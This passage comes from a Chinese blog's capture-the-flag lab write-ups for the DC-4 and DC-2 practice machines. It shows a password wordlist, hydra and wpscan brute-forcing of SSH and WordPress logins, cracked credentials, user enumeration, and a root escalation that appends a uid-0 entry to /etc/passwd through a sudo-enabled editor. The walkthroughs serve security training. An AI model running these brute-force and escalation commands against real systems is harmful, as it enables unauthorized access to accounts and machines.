alt="image-20240706235128164"></p><blockquote><p>.bak后缀的文件通常是备份文件。用于存储数据的副本，以防止原始文件意外丢失或损坏。</p></blockquote><p>查看其具体内容,可以猜测是一个密码字典。对其进行复制保存，也许以后爆破的时候会用上。</p><blockquote><p>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>123<br>myspace1<br>a123456<br>121212<br>1qaz2wsx<br>123qwe<br>123abc<br>tinkle<br>target123<br>gwerty<br>1g2w3e4r<br>gwerty123<br>zag12wsx<br>7777777<br>qwerty1<br>1q2w3e4r<br>987654321<br>222222<br>qwe123<br>qwerty123<br>zxcvbnm<br>555555<br>112233<br>fuckyou<br>asdfghjkl<br>12345a<br>123123123<br>1q2w3e<br>qazwsx<br>loveme1<br>juventus<br>jennifer1<br>!~!1<br>bubbles<br>samuel<br>fuckoff<br>lovers<br>cheese1<br>0123456<br>123asd<br>999999999<br>madison<br>elizabeth1<br>music<br>buster1<br>lauren<br>david1<br>tigger1<br>123qweasd<br>taylor1<br>carlos<br>tinkerbell<br>samantha1<br>Sojdlg123aljg<br>joshua1<br>poop<br>stella<br>myspace123<br>asdasd5<br>freedom1<br>whatever1<br>xxxxxx<br>00000<br>valentina<br>a1b2c3<br>741852963<br>austin<br>monica<br>qaz123<br>lovely1<br>music1<br>harley1<br>family1<br>spongebob1<br>steven<br>nirvana<br>1234abcd<br>hellokitty<br>thomas1<br>cooper<br>520520<br>muffin<br>christian1<br>love13<br>fucku2<br>arsenal1<br>lucky7<br>diablo<br>apples<br>george1<br>babyboy1<br>crystal<br>1122334455<br>player1<br>aa123456<br>vfhbyf<br>forever1<br>Password<br>winston<br>chivas1<br>sexy<br>hockey1<br>1a2b3c4d<br>pussy<br>playboy1<br>stalker<br>cherry<br>tweety<br>toyota<br>creative<br>gemini<br>pretty1<br>maverick<br>brittany1<br>nathan1<br>letmein1<br>cameron1<br>secret1<br>google1<br>heaven<br>martina<br>murphy<br>spongebob<br>uQA9Ebw445<br>fernando<br>pretty<br>startfinding<br>softball<br>dolphin1<br>fuckme<br>test123<br>qwerty1234<br>kobe24<br>alejandro<br>adrian<br>september<br>aaaaaa1<br>bubba1<br>isabella<br>abc123456<br>password3<br>jason1<br>abcdefg123<br>loveyou1<br>shannon<br>100200<br>manuel<br>leonardo<br>molly1<br>flowers<br>123456z<br>007007<br>password.<br>321321<br>miguel<br>samsung1<br>sergey<br>sweet1<br>abc1234<br>windows<br>qwert123<br>vfrcbv<br>poohbear<br>d123456<br>school1<br>badboy<br>951753<br>123456c<br>111<br>steven1<br>snoopy1<br>garfield<br>YAgjecc826<br>compaq<br>candy1<br>sarah1<br>qwerty123456<br>123456l<br>eminem1<br>141414<br>789789<br>maria<br>steelers<br>iloveme1<br>morgan1<br>winner<br>boomer<br>lolita<br>nastya<br>alexis1<br>carmen<br>angelo<br>nicholas1<br>portugal<br>precious<br>jackass1<br>jonathan1<br>yfnfif<br>bitch<br>tiffany<br>rabbit<br>rainbow1<br>angel123<br>popcorn<br>barbara<br>brandy<br>starwars1<br>barney<br>natalia<br>jibril04<br>hiphop<br>tiffany1<br>shorty<br>poohbear1<br>simone<br>albert<br>marlboro<br>hardcore<br>cowboys<br>sydney<br>alex<br>scorpio<br>1234512345<br>q12345<br>qq123456<br>onelove<br>bond007<br>abcdefg1<br>eagles<br>crystal1<br>azertyuiop<br>winter<br>sexy12<br>angelina<br>james<br>svetlana<br>fatima<br>123456k<br>icecream<br>popcorn1</p></blockquote><p>kali默认密码字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p>pay：如果之前没有进入到目标目录对默认字典文件进行解压的话，是会报错的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gunzip rockyou.txt.gz<br></code></pre></td></tr></table></figure><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>使用默认密码字典进行爆破的话所需的时间 太长了，而且也有爆破失败的风险</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L usersname.txt -P passworddicDC4.txt ssh://192.168.204.133<br></code></pre></td></tr></table></figure><p>其中：</p><p><code>passworddicDC4.txt</code>是上述从jim文件夹中获取到的密码备份文件。</p><p><code>usersname.txt</code>中包含在目标靶机home目录下的疑似用户文件夹的三个用户名。</p><p>ok！很快就爆破出了一个合法的SSH账户：</p><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131345123.png" alt="image-20240715131345123"></p><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jim@192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131622681.png" alt="image-20240715131622681"></p><p>ok！成功远程登陆了jim账户。</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131837232.png" alt="image-20240715131837232"></p><p>由上述执行结果可知，需要输入jim用户的sudo账户密码，但是我们不知道。</p><p>接着我们查看jim用户所在系统中具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132113057.png" alt="image-20240715132113057"></p><p>这其中，可以尝试的提权指令有：exim4、mount、su、passwd。但是经过上述的经验，最终能成功进行提权的命令只有exim4，但是它的提权过程比较复杂。</p><p>所以我们可以尝试获取其它信息并择出其中有用的信息进行提权。</p><p>使用<code>ls</code>指令查看当前用户的目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132521386.png" alt="image-20240715132521386"></p><p>发现了一个shell脚本<code>test.sh</code>，但是光看名字感觉就好像不太能提权的样子。还有一个提示信息，提示在存储邮件文件的文件夹<code>/var/mail/jim</code>下有新的邮件，尝试进入查看并寻找有用信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail/jim<br></code></pre></td></tr></table></figure><p>提示错误：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132833915.png" alt="image-20240715132833915"></p><p>再次尝试进入其上一级目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> jim<br></code></pre></td></tr></table></figure><p>成功：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132958425.png" alt="image-20240715132958425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133158149.png" alt="image-20240715133158149"></p><p>读取邮件信息可以得到jim的同事，Charles的账户信息：</p><blockquote><p>user：Charles</p><p>password：^xHhA&amp;hvim0y</p></blockquote><p>尝试远程登陆Charles的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh Charles@192.168.204.133<br></code></pre></td></tr></table></figure><p>因为已经远程登陆了jim账户，所再尝试同时登陆Charles的账户时就会被拒绝请求，因此我们需要在jim终端进行账户切换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Charles<br>su charles<br></code></pre></td></tr></table></figure><p>惹，报错惹：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133710662.png" alt="image-20240715133710662"></p><p>回去查看了一下邮件，发现其对jim的称呼为<code>Jim</code>，猜测实际用户名应该是小写开头。</p><p>ok！成功切换：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133858991.png" alt="image-20240715133858991"></p><p>查看charles用户中具有SUID权限的命令都有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134104570.png" alt="image-20240715134104570"></p><p>查询结果和jim的一样，再使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134313545.png" alt="image-20240715134313545"></p><p>根据提示信息可以知道，<code>/usr/bin/teehee</code>具有root权限，可以尝试提权。</p><blockquote><p>teehee是一个小众的linux编辑器，若其拥有root权限，则可用于提权。提权的核心思路是：利用其在passwd文件中追加一条uid为0的用户条目。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Name::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><p>这里的<code>Name</code>可以是任意名字。执行该条指令之后，再执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Name<br></code></pre></td></tr></table></figure><p>即可成功提权！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135103294.png" alt="image-20240715135103294"></p><p>四处查看文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135346117.png" alt="image-20240715135346117"></p><p>退回上一级目录，进行文件匹配查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135445574.png" alt="image-20240715135445574"></p><p>ok！成功找到！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135511759.png" alt="image-20240715135511759"></p><p>提权完毕！</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>使用hydra爆破SSH账户进行提权，其过程要比burpsuite爆破并进行exim4提权的过程要简单和快速。</p><ol><li>信息检索能力很重要，拿到主机shell的时候多去翻翻目录<code>var</code>、<code>home</code>等等目录，找找信息。</li><li>exim4、teehee可以用于提权，多找命令。</li><li>如何使用命令执行反弹shell。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/07/24/DC-2/"/>
    <url>/2024/07/24/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>查看kali主机IP：（ifconfig）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827301193.png"></p><p>将目标靶机的“网络适配器”模式改为“NAT”模式，保证其使用与kali相同的模式，即使得二者处于同一个网段内。</p><p>使用nmap扫描确认靶机的IP地址（最好在root权限下进行操作，以防出现权限不足的情况）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>未打开靶机前进行kali网段IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827357707.png" alt="img"></p><p>打开靶机后进行kali网络IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827411142.png" alt="img"></p><p>通过对比可以得到，靶机的IP地址为：<code>192.168.204.131</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li><p>普通开放端口扫描</p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.131<br>nmap -sT -p- 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827522630.png" alt="img"></p><p>可以看到，开放的端口有<code>80</code>和<code>7744</code>。</p><ul><li><p>开放端口详细扫描</p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,7744 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827560872.png" alt="img"></p><p>由扫描结果，似乎没有什么有用的信息，比如目标靶机是使用什么框架的网站之类的。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>端口扫描得到的有效信息太少，所以尝试使用gobuster目录爆破去获取更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827634237.png" alt="img"></p><p>获得三个目标靶机目录下的网页链接:</p><blockquote><p> <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p> <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p> <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>对这三个网页逐个进行访问:</p><p>① <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a> 没有内容加载出来</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827670668.png" alt="img"></p><p>② <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a> 有很多php脚本文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827720354.png"></p><p>③ <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a> 无法访问</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827759682.png" alt="img"></p><p>而且可以发现,输入网址<code>http://192.168.204.131/wp-admin/</code>,浏览器总会将其重定向至<code>dc-2</code>导致发生错误。</p><h2 id="重定向修改访问"><a href="#重定向修改访问" class="headerlink" title="重定向修改访问"></a>重定向修改访问</h2><p>访问目标靶机的IP地址，<code>192.168.204.131</code>，查看网页的返回界面。如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827793444.png" alt="img"></p><p>经过多次尝试之后可以得知，每次访问目标靶机IP地址时，其响应网页都会被重定向到域名<code>dc-2</code>。由此判断，该IP地址网页被做了重定向处理。</p><p>回顾之前的nmap详细扫描，已经展现出一些网页重定向的端倪了：</p><p>（由于第一次实验图片丢失，第二遍补做实验的时候nmap详细扫描出来的结果稍有变化，但第一次实验其http-title确实有如下提示）</p><blockquote><p>http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a></p><p>​  未遵循重定向到<a href="http://dc-2/">http://dc-2/</a></p></blockquote><p>解决重定向处理问题，找到原靶机主页的方法（之一）：</p><blockquote><p>对本地（kali）的host文件进行修改。</p><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.131 dc-2</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>然后在上方的<code>IP-域名</code>处添加靶机IP与“dc-2”的关联记录。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828170873.png" alt="img"></p><p>然后在浏览器中重新访问靶机IP地址，得到的效果如下：</p><blockquote><p>注意! 这里的DNS记录添加到的是kali内部的<code>hosts</code>文件，所以重定向修改生效的效果也只会在kali虚拟机内部展现出来。</p><p>如果想要在自己的物理主机上也能实现重定向修改的话，需要修改<code>本物理主机的hosts</code>文件。以管理员权限访问 <code>C:\Windows\System32\drivers\etc</code>下的hosts文件，添加靶机IP与“dc-2”的关联记录。</p></blockquote><p>在kali浏览器中访问网址<code>192.168.204.131</code>，得到的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828285726.png" alt="img"></p><p>可以看到，已经不是之前的重定向无响应界面了，网址的返回网页是正常网页类型。</p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>环视网页内容，可以发现右下角有一个<code>flag1</code>字样的选择栏，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828251738.png" alt="img"></p><p>flag1有一个提示信息：</p><blockquote><p>Flag 1:</p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>你通常的单词表（字典）可能不起作用，因此，也许你只需要（成为）cewl</p></blockquote><p>cewl是什么？经过网络查询。</p><table><thead><tr><th align="left">cewl，自定义词表生成器，是一个ruby程序，是kali linux下的一个工具。可以将特定URL爬取到定义的深度并返回关键字列表（字典）。密码破解者如John the Ripper、Medusa和 WFuzz 可以使用这些关键字来破解密码。Cewl 还有一个相关的命令行应用程序 FAB，它使用相同的元数据提取技术，使用 CeWL 等信息提取算法从已下载的文件中生成作者&#x2F;制作者列表。</th></tr></thead></table><p>Kali Linux字典生成工具Cewl使用全指南：</p><p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>你以为接下来就是要开始使用cewl啦？别急，我们先干接下来这事。</p><p>回顾靶场dc-1，我们通过识别nmap漏扫获取了网页的使用框架，然后通过metasploit查找该框架的漏洞。利用漏洞实现了用户登陆以及用户提权。</p><p>所以在dc-2这个靶场中，我们也尝试通过获取目标网页所使用框架等技术构成信息。但是前面的端口扫描也没有扫出什么有用的信息，所以我们尝试使用whatweb指纹工具来进行识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629104913096.png" alt="image-20240629104913096"></p><p>或者利用浏览器插件wappalyer进行指纹识别：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629105413201.png" alt="image-20240629105413201"></p><p>得到的部分信息如下：</p><blockquote><p> WordPress 4.7.10</p><p> Apache 2.4.10</p><p> JQuery 1.12.4</p><p> JQuery MIgrate 1.4.1</p><p> Databases MySQL</p></blockquote><p>其中<code>WordPress</code>是一个广泛使用的开源CMS，基于PHP语言开发。ok，我们又获取了网页的框架信息，尝试查找这个框架的相关漏洞，并尝试利用漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search WordPress<br></code></pre></td></tr></table></figure><p>可以找到有117个漏洞（很多，就不一一截图记录了）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629111815721.png" alt="image-20240629111815721"></p><p>可以尝试使用最新的一个漏洞进行利用尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629160813860.png" alt="image-20240629160813860"></p><p>利用这个23年11月的最新高等级的漏洞：</p><p> <code>exploit/multi/http/wp_royal_elementor_addons_rce</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/http/wp_royal_elementor_addons_rce<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161500801.png" alt="image-20240629161500801"></p><p>可以看到，这里的<code>RHOSTS</code>也设置为必须设置，因此我们可以尝试设置其为目标靶机地址<code>192.168.204.131</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.131<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161754704.png" alt="image-20240629161754704"></p><p>执行运行命令：run&#x2F;exploit</p><p>正常来说，如果成功应用的话会返回提示信息“Meterpreter session 1 opened”</p><p>但是根据打印出来的提示信息，发现无论是执行run还是exploit命令，都没有session被成功创建。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161951832.png" alt="image-20240629161951832"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629162306263.png" alt="image-20240629162306263"></p><p>所以这个漏洞我们没法利用。</p><p>尝试利用其它漏洞，但发现修改都没办法应用执行。所以通过漏洞来实现攻击这一方法遇到了瓶颈。</p><p>ok！既然常规思维无法利用漏洞。那么我们就琢磨一下flag1提示的<code>cewl</code>。</p><blockquote><p>cewl -h ：帮助命令，输出所有可接受的选项参数以及对应的选项描述。</p><p>默认方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://www.ignitetechnologies.in/（指定URL）<br></code></pre></td></tr></table></figure><p>输入命令之后，爬虫会根据<strong>指定的URL</strong>和深度进行爬取，然后打印出可用于密码破解的字典。</p><p>若想将打印出的字典存储为文件，则使用<code>-w Name.txt</code>参数来将其存储为txt文件。</p><p>若想生成指定长度的密码字典，则通过使用<code>-m length</code>选项来设置，保证生成的密码长度至少为九位。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://dc-2/ -w CewlDict.txt<br><br><span class="hljs-built_in">cat</span> CewlDict.txt<br></code></pre></td></tr></table></figure><p>得到一个可用于密码破解的字典（关键字列表）文件：</p><blockquote><p>这里访问的URL是通过域名访问的。因为前面的IP地址被重定向过。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629165118422.png" alt="image-20240629165118422"></p><p>通过 cewl 获得一个可用于密码破解的字典之后。之后的正常思路就是寻找登陆界面进行密码爆破攻击。但是前面在解决重定向问题访问靶机地址后返回的网页中，并没有显示出有关用户登陆的任何界面。</p><p>所以我们还得找！</p><p>之前进行目录爆破的时候，我们获取了三个目录链接：</p><blockquote><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>在kali（本地物理主机的hosts文件未修改，wp-admin界面依然会被重定向到dc-2造成错误）中分别再次访问这三个网页。</p><ul><li><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p>依然没有任何东西：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629170926175.png" alt="image-20240629170926175"></p></li><li><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p>返回的内容仍然是之前的那些，不知道有何作用，没有找到啥有价值的东西。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171052842.png" alt="image-20240629171052842"></p></li><li><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p><p>原本是无响应的被重定向的界面，现在返回了一个登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171202086.png" alt="image-20240629171202086"></p></li></ul><p>ok！登陆界面找到啦！！！</p><p>捋一下，现在密码字典有了，登陆界面有了，剩下还需要查找用户名，就可以进行密码爆破了。</p><h2 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h2><p>什么是wpscan扫描？</p><table><thead><tr><th align="left"><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。常搭配<code>Nikto</code>使用，一款非常棒的<code>Web</code> 服务器评估工具。</th></tr></thead></table><p>使用教程：<a href="https://blog.csdn.net/weixin_41924764/article/details/120984618%EF%BC%88WPScan%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B%E4%B9%8B%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9WordPress%E7%9A%84%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%89">https://blog.csdn.net/weixin_41924764/article/details/120984618（WPScan使用完整教程之记一次对WordPress的渗透过程）</a></p><p>为什么是wpscan？</p><p>因为前面进行指纹识别的时候得到的网站信息，其使用了<code>WordPress</code>框架。</p><h3 id="wpscan扫描WordPress有效用户"><a href="#wpscan扫描WordPress有效用户" class="headerlink" title="wpscan扫描WordPress有效用户"></a>wpscan扫描WordPress有效用户</h3><p>通过扫描在wordpress中有效的用户，确定用户的用户名，进而使用密码字典进行爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -e u<br></code></pre></td></tr></table></figure><p>执行命令（注意是<code>--url</code>两条<code>-</code>哦）。</p><p>在查询结果中，有一块<code>User(s) Identified:</code>（已认证用户）模块选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629180120896.png" alt="image-20240629180120896"></p><p>可以看到，有三个已通过认证的用户：</p><blockquote><p>admin</p><p>jerry</p><p>tom</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> usersname.txt<br>vim usersname.txt<br><span class="hljs-built_in">cat</span> usersname.txt<br></code></pre></td></tr></table></figure><p>新建一个文件，将用户名存入文件中，保存退出，cat查看文件内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629182533839.png" alt="image-20240629182533839"></p><h3 id="爆破用户密码"><a href="#爆破用户密码" class="headerlink" title="爆破用户密码"></a>爆破用户密码</h3><p>使用获取得到的用户名字典和密码字典进行爆破，获取可登陆用户账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -U usersname.txt -P CewlDict.txt<br></code></pre></td></tr></table></figure><p><code>-U</code>：指定用户名字典</p><p><code>-P</code>：指定密码爆破字典</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185111829.png" alt="image-20240629185111829"></p><p>爆破出两个普通用户的账户密码咯！</p><blockquote><p>Username: jerry, Password: adipiscing</p><p>Username: tom, Password: parturient</p></blockquote><p>使用这两个账号登陆（这里使用jerry的登陆）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185920193.png" alt="image-20240629185920193"></p><p>浏览当前页面信息，并没有一些有用的信息。</p><p>继续浏览其它模块的界面：</p><p>在<code>Pages</code>模块发现了选项Flag2:</p><p><img 